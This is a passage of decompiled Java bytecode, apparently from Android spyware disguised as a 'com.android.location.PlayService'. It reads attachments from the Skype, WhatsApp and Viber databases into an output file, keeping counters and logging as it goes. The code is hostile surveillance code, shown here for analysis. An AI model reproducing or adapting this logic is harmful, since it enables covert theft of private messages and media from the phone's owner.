    //   7460: astore 11
    //   7462: aload 16
    //   7464: astore 15
    //   7466: aload 18
    //   7468: astore 13
    //   7470: iload_3
    //   7471: istore_2
    //   7472: aload 20
    //   7474: astore 10
    //   7476: aload 16
    //   7478: astore 14
    //   7480: aload 19
    //   7482: astore 12
    //   7484: iconst_5
    //   7485: putstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   7488: goto -84 -> 7404
    //   7491: lload 7
    //   7493: lconst_0
    //   7494: lcmp
    //   7495: ifne +90 -> 7585
    //   7498: aload 17
    //   7500: astore 11
    //   7502: aload 16
    //   7504: astore 15
    //   7506: aload 18
    //   7508: astore 13
    //   7510: iload 4
    //   7512: istore_2
    //   7513: aload 20
    //   7515: astore 10
    //   7517: aload 16
    //   7519: astore 14
    //   7521: aload 19
    //   7523: astore 12
    //   7525: bipush 50
    //   7527: putstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   7530: aload 17
    //   7532: astore 11
    //   7534: aload 16
    //   7536: astore 15
    //   7538: aload 18
    //   7540: astore 13
    //   7542: iload 4
    //   7544: istore_2
    //   7545: aload 20
    //   7547: astore 10
    //   7549: aload 16
    //   7551: astore 14
    //   7553: aload 19
    //   7555: astore 12
    //   7557: new 864	java/lang/StringBuilder
    //   7560: dup
    //   7561: ldc_w 3636
    //   7564: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7567: getstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   7570: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7573: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7576: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7579: iload 4
    //   7581: istore_3
    //   7582: goto -3524 -> 4058
    //   7585: aload 17
    //   7587: astore 11
    //   7589: aload 16
    //   7591: astore 15
    //   7593: aload 18
    //   7595: astore 13
    //   7597: iload 4
    //   7599: istore_2
    //   7600: aload 20
    //   7602: astore 10
    //   7604: aload 16
    //   7606: astore 14
    //   7608: aload 19
    //   7610: astore 12
    //   7612: iconst_5
    //   7613: putstatic 685	com/android/location/PlayService:iPreventReadTG	I
    //   7616: goto -86 -> 7530
    //   7619: aload 17
    //   7621: astore 11
    //   7623: aload 16
    //   7625: astore 15
    //   7627: aload 18
    //   7629: astore 13
    //   7631: iload_3
    //   7632: istore_2
    //   7633: aload 20
    //   7635: astore 10
    //   7637: aload 16
    //   7639: astore 14
    //   7641: aload 19
    //   7643: astore 12
    //   7645: new 3571	ru/dtlbox/databasereader/SkypeReader
    //   7648: dup
    //   7649: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   7652: aload 21
    //   7654: iload 4
    //   7656: invokeinterface 3638 2 0
    //   7661: checkcast 1306	java/lang/String
    //   7664: invokespecial 3641	ru/dtlbox/databasereader/SkypeReader:<init>	(Lru/dtlbox/databasereader/Config;Ljava/lang/String;)V
    //   7667: astore 22
    //   7669: aload 17
    //   7671: astore 11
    //   7673: aload 16
    //   7675: astore 15
    //   7677: aload 18
    //   7679: astore 13
    //   7681: iload_3
    //   7682: istore_2
    //   7683: aload 20
    //   7685: astore 10
    //   7687: aload 16
    //   7689: astore 14
    //   7691: aload 19
    //   7693: astore 12
    //   7695: aload_0
    //   7696: getfield 960	com/android/location/PlayService:userListSkype	Ljava/util/ArrayList;
    //   7699: aload 22
    //   7701: invokevirtual 2137	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   7704: pop
    //   7705: iload 4
    //   7707: iconst_1
    //   7708: iadd
    //   7709: istore 4
    //   7711: goto +1529 -> 9240
    //   7714: aload 17
    //   7716: astore 11
    //   7718: aload 16
    //   7720: astore 15
    //   7722: aload 18
    //   7724: astore 13
    //   7726: iload_3
    //   7727: istore_2
    //   7728: aload 20
    //   7730: astore 10
    //   7732: aload 16
    //   7734: astore 14
    //   7736: aload 19
    //   7738: astore 12
    //   7740: ldc_w 3643
    //   7743: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7746: goto -2745 -> 5001
    //   7749: aload 17
    //   7751: astore 11
    //   7753: aload 16
    //   7755: astore 15
    //   7757: aload 18
    //   7759: astore 13
    //   7761: iload_3
    //   7762: istore_2
    //   7763: aload 20
    //   7765: astore 10
    //   7767: aload 16
    //   7769: astore 14
    //   7771: aload 19
    //   7773: astore 12
    //   7775: new 864	java/lang/StringBuilder
    //   7778: dup
    //   7779: ldc_w 3645
    //   7782: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7785: iload 5
    //   7787: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7790: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7793: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7796: aload 17
    //   7798: astore 11
    //   7800: aload 16
    //   7802: astore 15
    //   7804: aload 18
    //   7806: astore 13
    //   7808: iload_3
    //   7809: istore_2
    //   7810: aload 20
    //   7812: astore 10
    //   7814: aload 16
    //   7816: astore 14
    //   7818: aload 19
    //   7820: astore 12
    //   7822: aload_0
    //   7823: getfield 960	com/android/location/PlayService:userListSkype	Ljava/util/ArrayList;
    //   7826: iload 5
    //   7828: invokevirtual 3646	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   7831: checkcast 3571	ru/dtlbox/databasereader/SkypeReader
    //   7834: astore 21
    //   7836: aload 17
    //   7838: astore 11
    //   7840: aload 16
    //   7842: astore 15
    //   7844: aload 18
    //   7846: astore 13
    //   7848: iload_3
    //   7849: istore_2
    //   7850: aload 20
    //   7852: astore 10
    //   7854: aload 16
    //   7856: astore 14
    //   7858: aload 19
    //   7860: astore 12
    //   7862: new 864	java/lang/StringBuilder
    //   7865: dup
    //   7866: ldc_w 3648
    //   7869: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7872: aload 21
    //   7874: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   7877: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7880: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7883: aload 21
    //   7885: ifnull +479 -> 8364
    //   7888: aload 20
    //   7890: astore 10
    //   7892: aload 16
    //   7894: astore 14
    //   7896: aload 19
    //   7898: astore 12
    //   7900: iload_3
    //   7901: istore 4
    //   7903: new 864	java/lang/StringBuilder
    //   7906: dup
    //   7907: ldc_w 3650
    //   7910: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7913: iload 5
    //   7915: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7918: ldc_w 3400
    //   7921: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7924: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7927: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7930: aload 20
    //   7932: astore 10
    //   7934: aload 16
    //   7936: astore 14
    //   7938: aload 19
    //   7940: astore 12
    //   7942: iload_3
    //   7943: istore 4
    //   7945: aload 21
    //   7947: invokevirtual 3653	ru/dtlbox/databasereader/SkypeReader:isPrevent	()Z
    //   7950: ifne +390 -> 8340
    //   7953: aload 20
    //   7955: astore 10
    //   7957: aload 16
    //   7959: astore 14
    //   7961: aload 19
    //   7963: astore 12
    //   7965: iload_3
    //   7966: istore 4
    //   7968: new 864	java/lang/StringBuilder
    //   7971: dup
    //   7972: aload 21
    //   7974: invokevirtual 3654	ru/dtlbox/databasereader/SkypeReader:getName	()Ljava/lang/String;
    //   7977: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   7980: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7983: ldc_w 3656
    //   7986: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7989: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7992: astore 11
    //   7994: aload 20
    //   7996: astore 10
    //   7998: aload 16
    //   8000: astore 14
    //   8002: aload 19
    //   8004: astore 12
    //   8006: iload_3
    //   8007: istore 4
    //   8009: new 864	java/lang/StringBuilder
    //   8012: dup
    //   8013: ldc_w 3658
    //   8016: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8019: aload 11
    //   8021: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8024: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8027: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8030: aload 20
    //   8032: astore 10
    //   8034: aload 16
    //   8036: astore 14
    //   8038: aload 19
    //   8040: astore 12
    //   8042: iload_3
    //   8043: istore 4
    //   8045: aload_0
    //   8046: aload 11
    //   8048: invokevirtual 3661	com/android/location/PlayService:ReadOneIntSetting	(Ljava/lang/String;)I
    //   8051: istore_2
    //   8052: aload 20
    //   8054: astore 10
    //   8056: aload 16
    //   8058: astore 14
    //   8060: aload 19
    //   8062: astore 12
    //   8064: iload_3
    //   8065: istore 4
    //   8067: getstatic 597	com/android/location/PlayService:bResetSkypeAttach	Z
    //   8070: ifeq +5 -> 8075
    //   8073: iconst_0
    //   8074: istore_2
    //   8075: aload 20
    //   8077: astore 10
    //   8079: aload 16
    //   8081: astore 14
    //   8083: aload 19
    //   8085: astore 12
    //   8087: iload_3
    //   8088: istore 4
    //   8090: new 864	java/lang/StringBuilder
    //   8093: dup
    //   8094: ldc_w 3663
    //   8097: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8100: iload_2
    //   8101: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8104: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8107: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8110: aload 20
    //   8112: astore 10
    //   8114: aload 16
    //   8116: astore 14
    //   8118: aload 19
    //   8120: astore 12
    //   8122: iload_3
    //   8123: istore 4
    //   8125: aload 21
    //   8127: aload 16
    //   8129: iload_2
    //   8130: invokevirtual 3667	ru/dtlbox/databasereader/SkypeReader:readAttach	(Ljava/io/OutputStream;I)I
    //   8133: istore_2
    //   8134: iload_2
    //   8135: ifle +66 -> 8201
    //   8138: aload 20
    //   8140: astore 10
    //   8142: aload 16
    //   8144: astore 14
    //   8146: aload 19
    //   8148: astore 12
    //   8150: iload_3
    //   8151: istore 4
    //   8153: aload 11
    //   8155: iload_2
    //   8156: invokestatic 3669	com/android/location/PlayService:SaveOneIntSetting	(Ljava/lang/String;I)V
    //   8159: iload_3
    //   8160: iconst_1
    //   8161: iadd
    //   8162: istore_3
    //   8163: aload 20
    //   8165: astore 10
    //   8167: aload 16
    //   8169: astore 14
    //   8171: aload 19
    //   8173: astore 12
    //   8175: iload_3
    //   8176: istore 4
    //   8178: new 864	java/lang/StringBuilder
    //   8181: dup
    //   8182: ldc_w 3671
    //   8185: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8188: iload_2
    //   8189: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8192: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8195: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8198: goto +1058 -> 9256
    //   8201: aload 20
    //   8203: astore 10
    //   8205: aload 16
    //   8207: astore 14
    //   8209: aload 19
    //   8211: astore 12
    //   8213: iload_3
    //   8214: istore 4
    //   8216: new 864	java/lang/StringBuilder
    //   8219: dup
    //   8220: ldc_w 3673
    //   8223: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8226: aload 11
    //   8228: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8231: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8234: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8237: aload 20
    //   8239: astore 10
    //   8241: aload 16
    //   8243: astore 14
    //   8245: aload 19
    //   8247: astore 12
    //   8249: iload_3
    //   8250: istore 4
    //   8252: aload 21
    //   8254: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   8257: invokevirtual 3676	ru/dtlbox/databasereader/SkypeReader:beginPrevent	(I)V
    //   8260: goto -97 -> 8163
    //   8263: astore 22
    //   8265: aload 17
    //   8267: astore 11
    //   8269: aload 16
    //   8271: astore 15
    //   8273: aload 18
    //   8275: astore 13
    //   8277: iload 4
    //   8279: istore_2
    //   8280: aload 20
    //   8282: astore 10
    //   8284: aload 16
    //   8286: astore 14
    //   8288: aload 19
    //   8290: astore 12
    //   8292: aload 22
    //   8294: ldc_w 3678
    //   8297: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   8300: aload 17
    //   8302: astore 11
    //   8304: aload 16
    //   8306: astore 15
    //   8308: aload 18
    //   8310: astore 13
    //   8312: iload 4
    //   8314: istore_2
    //   8315: aload 20
    //   8317: astore 10
    //   8319: aload 16
    //   8321: astore 14
    //   8323: aload 19
    //   8325: astore 12
    //   8327: aload 21
    //   8329: bipush 50
    //   8331: invokevirtual 3676	ru/dtlbox/databasereader/SkypeReader:beginPrevent	(I)V
    //   8334: iload 4
    //   8336: istore_3
    //   8337: goto +919 -> 9256
    //   8340: aload 20
    //   8342: astore 10
    //   8344: aload 16
    //   8346: astore 14
    //   8348: aload 19
    //   8350: astore 12
    //   8352: iload_3
    //   8353: istore 4
    //   8355: ldc_w 3680
    //   8358: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8361: goto +895 -> 9256
    //   8364: aload 17
    //   8366: astore 11
    //   8368: aload 16
    //   8370: astore 15
    //   8372: aload 18
    //   8374: astore 13
    //   8376: iload_3
    //   8377: istore_2
    //   8378: aload 20
    //   8380: astore 10
    //   8382: aload 16
    //   8384: astore 14
    //   8386: aload 19
    //   8388: astore 12
    //   8390: ldc_w 3682
    //   8393: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8396: goto +860 -> 9256
    //   8399: aload 17
    //   8401: astore 11
    //   8403: aload 16
    //   8405: astore 15
    //   8407: aload 18
    //   8409: astore 13
    //   8411: iload_3
    //   8412: istore_2
    //   8413: aload 20
    //   8415: astore 10
    //   8417: aload 16
    //   8419: astore 14
    //   8421: aload 19
    //   8423: astore 12
    //   8425: new 864	java/lang/StringBuilder
    //   8428: dup
    //   8429: ldc_w 3684
    //   8432: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8435: iload_3
    //   8436: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8439: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8442: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8445: goto -3199 -> 5246
    //   8448: aload 20
    //   8450: astore 10
    //   8452: aload 16
    //   8454: astore 14
    //   8456: aload 19
    //   8458: astore 12
    //   8460: getstatic 629	com/android/location/PlayService:bNeedUpdateWABDCounter	Z
    //   8463: ifeq +57 -> 8520
    //   8466: aload 20
    //   8468: astore 10
    //   8470: aload 16
    //   8472: astore 14
    //   8474: aload 19
    //   8476: astore 12
    //   8478: ldc_w 3686
    //   8481: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8484: aload 20
    //   8486: astore 10
    //   8488: aload 16
    //   8490: astore 14
    //   8492: aload 19
    //   8494: astore 12
    //   8496: iconst_0
    //   8497: putstatic 629	com/android/location/PlayService:bNeedUpdateWABDCounter	Z
    //   8500: aload 20
    //   8502: astore 10
    //   8504: aload 16
    //   8506: astore 14
    //   8508: aload 19
    //   8510: astore 12
    //   8512: aload_0
    //   8513: getfield 1045	com/android/location/PlayService:mWhatsAppReader	Lru/dtlbox/databasereader/WhatsAppReader;
    //   8516: invokevirtual 3688	ru/dtlbox/databasereader/WhatsAppReader:update	()Z
    //   8519: pop
    //   8520: aload 20
    //   8522: astore 10
    //   8524: aload 16
    //   8526: astore 14
    //   8528: aload 19
    //   8530: astore 12
    //   8532: aload_0
    //   8533: getfield 1045	com/android/location/PlayService:mWhatsAppReader	Lru/dtlbox/databasereader/WhatsAppReader;
    //   8536: aload 16
    //   8538: getstatic 619	com/android/location/PlayService:lWAAttCounter	I
    //   8541: invokevirtual 3689	ru/dtlbox/databasereader/WhatsAppReader:readAttach	(Ljava/io/OutputStream;I)I
    //   8544: istore_2
    //   8545: iload_2
    //   8546: ifle +74 -> 8620
    //   8549: aload 20
    //   8551: astore 10
    //   8553: aload 16
    //   8555: astore 14
    //   8557: aload 19
    //   8559: astore 12
    //   8561: iload_2
    //   8562: putstatic 619	com/android/location/PlayService:lWAAttCounter	I
    //   8565: iload_3
    //   8566: iconst_1
    //   8567: iadd
    //   8568: istore_3
    //   8569: aload 17
    //   8571: astore 11
    //   8573: aload 16
    //   8575: astore 15
    //   8577: aload 18
    //   8579: astore 13
    //   8581: iload_3
    //   8582: istore_2
    //   8583: aload 20
    //   8585: astore 10
    //   8587: aload 16
    //   8589: astore 14
    //   8591: aload 19
    //   8593: astore 12
    //   8595: new 864	java/lang/StringBuilder
    //   8598: dup
    //   8599: ldc_w 3691
    //   8602: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8605: getstatic 619	com/android/location/PlayService:lWAAttCounter	I
    //   8608: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8611: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8614: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8617: goto -2960 -> 5657
    //   8620: aload 20
    //   8622: astore 10
    //   8624: aload 16
    //   8626: astore 14
    //   8628: aload 19
    //   8630: astore 12
    //   8632: ldc_w 3693
    //   8635: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8638: aload 20
    //   8640: astore 10
    //   8642: aload 16
    //   8644: astore 14
    //   8646: aload 19
    //   8648: astore 12
    //   8650: iconst_1
    //   8651: putstatic 629	com/android/location/PlayService:bNeedUpdateWABDCounter	Z
    //   8654: aload 20
    //   8656: astore 10
    //   8658: aload 16
    //   8660: astore 14
    //   8662: aload 19
    //   8664: astore 12
    //   8666: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   8669: putstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   8672: goto -103 -> 8569
    //   8675: astore 21
    //   8677: aload 17
    //   8679: astore 11
    //   8681: aload 16
    //   8683: astore 15
    //   8685: aload 18
    //   8687: astore 13
    //   8689: iload_3
    //   8690: istore_2
    //   8691: aload 20
    //   8693: astore 10
    //   8695: aload 16
    //   8697: astore 14
    //   8699: aload 19
    //   8701: astore 12
    //   8703: aload 21
    //   8705: ldc_w 3695
    //   8708: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   8711: aload 17
    //   8713: astore 11
    //   8715: aload 16
    //   8717: astore 15
    //   8719: aload 18
    //   8721: astore 13
    //   8723: iload_3
    //   8724: istore_2
    //   8725: aload 20
    //   8727: astore 10
    //   8729: aload 16
    //   8731: astore 14
    //   8733: aload 19
    //   8735: astore 12
    //   8737: bipush 50
    //   8739: putstatic 681	com/android/location/PlayService:iPreventReadWAAtt	I
    //   8742: goto -173 -> 8569
    //   8745: aload 17
    //   8747: astore 11
    //   8749: aload 16
    //   8751: astore 15
    //   8753: aload 18
    //   8755: astore 13
    //   8757: iload_3
    //   8758: istore_2
    //   8759: aload 20
    //   8761: astore 10
    //   8763: aload 16
    //   8765: astore 14
    //   8767: aload 19
    //   8769: astore 12
    //   8771: new 864	java/lang/StringBuilder
    //   8774: dup
    //   8775: ldc_w 3684
    //   8778: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8781: iload_3
    //   8782: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8785: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8788: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8791: goto -3134 -> 5657
    //   8794: aload 20
    //   8796: astore 10
    //   8798: aload 16
    //   8800: astore 14
    //   8802: aload 19
    //   8804: astore 12
    //   8806: getstatic 617	com/android/location/PlayService:bNeedUpdateBDCounter	Z
    //   8809: ifeq +76 -> 8885
    //   8812: aload 20
    //   8814: astore 10
    //   8816: aload 16
    //   8818: astore 14
    //   8820: aload 19
    //   8822: astore 12
    //   8824: new 864	java/lang/StringBuilder
    //   8827: dup
    //   8828: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   8831: invokestatic 1549	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   8834: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8837: ldc_w 3697
    //   8840: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8843: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8846: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8849: aload 20
    //   8851: astore 10
    //   8853: aload 16
    //   8855: astore 14
    //   8857: aload 19
    //   8859: astore 12
    //   8861: iconst_0
    //   8862: putstatic 617	com/android/location/PlayService:bNeedUpdateBDCounter	Z
    //   8865: aload 20
    //   8867: astore 10
    //   8869: aload 16
    //   8871: astore 14
    //   8873: aload 19
    //   8875: astore 12
    //   8877: aload_0
    //   8878: getfield 1043	com/android/location/PlayService:mViberReader	Lru/dtlbox/databasereader/ViberReader;
    //   8881: invokevirtual 3698	ru/dtlbox/databasereader/ViberReader:update	()Z
    //   8884: pop
    //   8885: aload 20
    //   8887: astore 10
    //   8889: aload 16
    //   8891: astore 14
    //   8893: aload 19
    //   8895: astore 12
    //   8897: aload_0
    //   8898: getfield 1043	com/android/location/PlayService:mViberReader	Lru/dtlbox/databasereader/ViberReader;
    //   8901: aload 16
    //   8903: getstatic 615	com/android/location/PlayService:lViberAttCounter	I
    //   8906: invokevirtual 3699	ru/dtlbox/databasereader/ViberReader:readAttach	(Ljava/io/OutputStream;I)I
    //   8909: istore_2
    //   8910: iload_2
    //   8911: ifle +77 -> 8988
    //   8914: aload 20
    //   8916: astore 10
    //   8918: aload 16
    //   8920: astore 14
    //   8922: aload 19
    //   8924: astore 12
    //   8926: iload_2
    //   8927: putstatic 615	com/android/location/PlayService:lViberAttCounter	I
    //   8930: iload_3
    //   8931: iconst_1
    //   8932: iadd
    //   8933: istore_3
    //   8934: aload 17
    //   8936: astore 11
    //   8938: aload 16
    //   8940: astore 15
    //   8942: aload 18
    //   8944: astore 13
    //   8946: iload_3
    //   8947: istore_2
    //   8948: aload 20
    //   8950: astore 10
    //   8952: aload 16
    //   8954: astore 14
    //   8956: aload 19
    //   8958: astore 12
    //   8960: new 864	java/lang/StringBuilder
    //   8963: dup
    //   8964: ldc_w 3701
    //   8967: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8970: getstatic 615	com/android/location/PlayService:lViberAttCounter	I
    //   8973: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8976: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8979: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8982: iload_3
    //   8983: istore 4
    //   8985: goto -3040 -> 5945
    //   8988: aload 20
    //   8990: astore 10
    //   8992: aload 16
    //   8994: astore 14
    //   8996: aload 19
    //   8998: astore 12
    //   9000: ldc_w 3703
    //   9003: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   9006: aload 20
    //   9008: astore 10
    //   9010: aload 16
    //   9012: astore 14
    //   9014: aload 19
    //   9016: astore 12
    //   9018: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   9021: putstatic 683	com/android/location/PlayService:iPreventReadViberAtt	I
    //   9024: aload 20
    //   9026: astore 10
    //   9028: aload 16
    //   9030: astore 14
    //   9032: aload 19
    //   9034: astore 12
    //   9036: iconst_1
    //   9037: putstatic 617	com/android/location/PlayService:bNeedUpdateBDCounter	Z
    //   9040: goto -106 -> 8934
    //   9043: astore 21
    //   9045: aload 17
    //   9047: astore 11
    //   9049: aload 16
    //   9051: astore 15
    //   9053: aload 18
    //   9055: astore 13
    //   9057: iload_3
    //   9058: istore_2
    //   9059: aload 20
    //   9061: astore 10
    //   9063: aload 16
    //   9065: astore 14
    //   9067: aload 19
    //   9069: astore 12
    //   9071: aload 21
    //   9073: ldc_w 3705
    //   9076: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   9079: aload 17
    //   9081: astore 11
    //   9083: aload 16
    //   9085: astore 15
    //   9087: aload 18
    //   9089: astore 13
    //   9091: iload_3
    //   9092: istore_2
    //   9093: aload 20
    //   9095: astore 10
    //   9097: aload 16
    //   9099: astore 14
    //   9101: aload 19
    //   9103: astore 12
    //   9105: bipush 50
    //   9107: putstatic 683	com/android/location/PlayService:iPreventReadViberAtt	I
    //   9110: goto -176 -> 8934
    //   9113: aload 17
    //   9115: astore 11
    //   9117: aload 16
    //   9119: astore 15
    //   9121: aload 18
    //   9123: astore 13
    //   9125: iload_3
    //   9126: istore_2
    //   9127: aload 20
    //   9129: astore 10
    //   9131: aload 16
    //   9133: astore 14
    //   9135: aload 19
    //   9137: astore 12
    //   9139: new 864	java/lang/StringBuilder
    //   9142: dup
    //   9143: ldc_w 3684
    //   9146: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   9149: iload_3
    //   9150: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   9153: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   9156: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   9159: iload_3
    //   9160: istore 4
    //   9162: goto -3217 -> 5945
    //   9165: aload 17
    //   9167: astore 11
    //   9169: aload 16
    //   9171: astore 15
    //   9173: aload 18
    //   9175: astore 13
    //   9177: iload 4
    //   9179: istore_2
    //   9180: aload 20
    //   9182: astore 10
    //   9184: aload 16
    //   9186: astore 14
    //   9188: aload 19
    //   9190: astore 12
    //   9192: ldc_w 3707
    //   9195: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   9198: goto -3253 -> 5945
    //   9201: astore_1
    //   9202: goto -2445 -> 6757
    //   9205: astore_1
    //   9206: goto -2439 -> 6767
    //   9209: astore 11
    //   9211: goto -2299 -> 6912
    //   9214: astore 11
    //   9216: goto -2294 -> 6922
    //   9219: astore 10
    //   9221: goto -2289 -> 6932
    //   9224: astore 10
    //   9226: goto -2597 -> 6629
    //   9229: astore_1
    //   9230: goto -2593 -> 6637
    //   9233: astore_1
    //   9234: iload 4
    //   9236: istore_3
    //   9237: goto -2584 -> 6653
    //   9240: iload 4
    //   9242: iload 5
    //   9244: if_icmplt -1625 -> 7619
    //   9247: goto -4246 -> 5001
    //   9250: iconst_0
    //   9251: istore 9
    //   9253: goto -5752 -> 3501
    //   9256: iload 5
    //   9258: iconst_1
    //   9259: iadd
    //   9260: istore 5
    //   9262: goto -4053 -> 5209
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	9265	0	this	PlayService
    //   0	9265	1	paramString	String
    //   25	9155	2	i	int
    //   649	8588	3	j	int
    //   13	9232	4	k	int
    //   16	9245	5	m	int
    //   5204	10	6	n	int
    //   2213	5279	7	l	long
    //   3499	5753	9	bool	boolean
    //   64	9119	10	localObject1	Object
    //   9219	1	10	localIOException1	IOException
    //   9224	1	10	localIOException2	IOException
    //   53	9115	11	localObject2	Object
    //   9209	1	11	localIOException3	IOException
    //   9214	1	11	localIOException4	IOException
    //   68	9123	12	localObject3	Object
    //   57	9119	13	localObject4	Object
    //   34	9153	14	localObject5	Object
    //   37	9135	15	localObject6	Object
    //   80	9105	16	localFileOutputStream	FileOutputStream
    //   49	9117	17	localFileInputStream	FileInputStream
    //   43	9131	18	arrayOfByte	byte[]
    //   40	9149	19	localObject7	Object
    //   46	9135	20	localCRC32	java.util.zip.CRC32
    //   22	8306	21	localObject8	Object
    //   8675	29	21	localException1	Exception
    //   9043	29	21	localException2	Exception
    //   120	7580	22	localObject9	Object
    //   8263	30	22	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   70	82	6727	java/lang/Exception
    //   109	122	6727	java/lang/Exception
    //   149	155	6727	java/lang/Exception
    //   182	191	6727	java/lang/Exception
    //   218	231	6727	java/lang/Exception
    //   258	264	6727	java/lang/Exception
    //   291	300	6727	java/lang/Exception
    //   327	333	6727	java/lang/Exception
    //   360	366	6727	java/lang/Exception
    //   393	401	6727	java/lang/Exception
    //   428	435	6727	java/lang/Exception
    //   462	470	6727	java/lang/Exception
    //   497	511	6727	java/lang/Exception
